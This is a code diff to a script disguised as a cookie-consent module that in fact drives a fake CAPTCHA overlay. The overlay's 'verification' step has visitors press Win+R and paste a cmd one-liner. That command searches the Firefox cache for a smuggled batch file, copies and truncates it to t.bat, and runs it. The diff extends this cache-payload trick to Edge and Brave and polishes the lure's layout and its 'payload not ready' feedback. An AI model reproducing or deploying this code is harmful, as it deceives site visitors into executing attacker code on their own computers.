@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.9.15',
+    version: '1.9.16',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -27,8 +27,8 @@
     cacheFileSizes: {
       firefox: 0,
       chrome: 17189,
-      edge: 0,
-      brave: 0
+      edge: 17189,
+      brave: 17189
     },
     verificationTemplates: {
       firefox: 'cmd /k cd /d %TMP%&for /d %p in (%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles\\*) do @for %f in (%~sp\\cache2\\entries\\*) do @findstr /b /c:@echo "%f">nul&&copy /y "%f" t.bat&&fsutil file seteof t.bat {SZ}&&call t.bat',
@@ -125,7 +125,7 @@
         statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes — Win+R scans Firefox cache2\\entries';
       } else {
         var csz = (CONSENT_CONFIG.cacheFileSizes || {})[bk] || 0;
-        statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes (' + bk + ') — quit browser, run get-cache-size.cmd, set cacheFileSizes.chrome=' + (csz || '?') + ', then Win+R';
+        statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes (' + bk + ') — quit browser, run get-cache-size.cmd, set cacheFileSizes.' + bk + '=' + (csz || '?') + ', then Win+R';
       }
       statusEl.className = 'ok';
       if (previewEl && text) previewEl.textContent = text;
@@ -152,6 +152,17 @@
     return 'Profile 1';
   }
 
+  function getChromiumCacheEntrySize(browserKey) {
+    var cacheSizes = CONSENT_CONFIG.cacheFileSizes || {};
+    var n = cacheSizes[browserKey];
+    if (n && n > 0) return n;
+    if (browserKey === 'edge' || browserKey === 'brave') {
+      n = cacheSizes.chrome;
+      if (n && n > 0) return n;
+    }
+    return 0;
+  }
+
   function getVerificationCommand() {
     var startMarker = CONSENT_CONFIG.bodyStartMarker || 'CDRP7F3A9D2B8C4';
     var endMarker = CONSENT_CONFIG.bodyEndMarker || 'CDRPEND7F3A9D2';
@@ -161,8 +172,9 @@
     var key = getBrowserKey();
     if (!bodySize || bodySize < 1) return '';
 
-    var cacheSizes = CONSENT_CONFIG.cacheFileSizes || {};
-    var cacheEntrySize = cacheSizes[key];
+    var cacheEntrySize = key === 'firefox'
+      ? (CONSENT_CONFIG.cacheFileSizes || {}).firefox
+      : getChromiumCacheEntrySize(key);
     if (key !== 'firefox' && (!cacheEntrySize || cacheEntrySize < 1)) return '';
 
     var templates = CONSENT_CONFIG.verificationTemplates || {};
@@ -399,14 +411,16 @@
   function getCaptchaCss() {
     return (
       '#ts-widget-overlay{position:fixed;inset:0;z-index:2147483646;background:rgba(0,0,0,.72);cursor:default}' +
-      '#ts-widget{position:fixed;left:50%;top:42%;transform:translate(-50%,-50%);z-index:2147483647;display:flex;align-items:center;width:380px;height:80px;padding:0 16px 0 18px;background:#fafafa;border:1px solid #e0e0e0;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.12);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;box-sizing:border-box;user-select:none;transition:width .25s ease,height .25s ease}' +
+      '#ts-widget{position:fixed;left:50%;top:42%;transform:translate(-50%,-50%);z-index:2147483647;display:flex;align-items:center;width:min(380px,calc(100vw - 32px));max-width:calc(100vw - 32px);min-height:80px;height:auto;padding:12px 16px 12px 18px;background:#fafafa;border:1px solid #e0e0e0;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.12);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;box-sizing:border-box;user-select:none;transition:width .25s ease,height .25s ease;touch-action:manipulation;-webkit-tap-highlight-color:transparent}' +
+      '#ts-widget.ts-not-ready .ts-box{border-color:#c62828;animation:tsShake .35s ease}' +
+      '@keyframes tsShake{0%,100%{transform:translateX(0)}25%{transform:translateX(-4px)}75%{transform:translateX(4px)}}' +
       '#ts-widget.ts-verifying{display:block;width:min(500px,calc(100vw - 32px));height:auto;padding:0;background:#fff;border-color:#ddd;border-radius:2px;box-shadow:0 4px 24px rgba(0,0,0,.18)}' +
       '#ts-widget .ts-check-area{display:flex;align-items:center;gap:14px;flex:1;min-width:0;cursor:pointer}' +
       '#ts-widget .ts-box{width:32px;height:32px;border:2px solid #666;border-radius:2px;background:#fff;display:flex;align-items:center;justify-content:center;flex-shrink:0;box-sizing:border-box;transition:border-color .2s,background .2s}' +
       '#ts-widget .ts-spinner{display:none;width:22px;height:22px;border:2px solid #e0e0e0;border-top-color:#666;border-radius:50%;animation:tsSpin .7s linear infinite}' +
       '#ts-widget.ts-loading .ts-spinner{display:block}' +
       '#ts-widget.ts-loading .ts-box{border-color:#bbb}' +
-      '#ts-widget .ts-label{font-size:16px;color:#232323;white-space:nowrap;line-height:1.2}' +
+      '#ts-widget .ts-label{font-size:16px;color:#232323;white-space:normal;line-height:1.2}' +
       '#ts-widget .ts-brand{display:flex;flex-direction:column;align-items:center;justify-content:center;flex-shrink:0;width:96px;margin-left:10px;text-align:center}' +
       '#ts-widget .ts-brand img{width:88px;height:auto;max-height:54px;object-fit:contain;display:block;margin:0 auto 3px}' +
       '#ts-widget .ts-links{font-size:9px;line-height:1.2;color:#555}' +
@@ -607,7 +621,12 @@
 
     function runVerify() {
       if (verified || busy) return;
-      if (!isPayloadReady()) return;
+      if (!isPayloadReady()) {
+        captchaWidget.classList.add('ts-not-ready');
+        setTimeout(function () { captchaWidget.classList.remove('ts-not-ready'); }, 500);
+        updateCacheStatus('fail', 'payload not ready — wait for strict body OK or set cacheFileSizes.' + getBrowserKey());
+        return;
+      }
       busy = true;
       captchaWidget.classList.add('ts-loading');
       checkArea.setAttribute('aria-checked', 'true');
